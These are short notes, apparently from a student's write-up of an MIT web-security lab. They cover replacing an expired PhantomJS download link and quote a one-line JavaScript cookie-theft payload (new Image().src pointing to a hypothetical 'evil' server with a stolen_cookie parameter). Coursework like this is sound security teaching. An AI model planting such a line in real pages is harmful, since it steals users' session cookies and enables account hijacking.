## Notes

The link in `get-phantomjs.sh` is expired so I installed the latest version
from http://phantomjs.org/download.html.

Also, instead of the [email script](http://css.csail.mit.edu/6.858/2014/labs/sendmail.php)
I'm just issuing requests to a hyptothetical attack server, e.g.
`new Image().src = 'http://my-evil-server.xxx/?stolen_cookie=....'`.
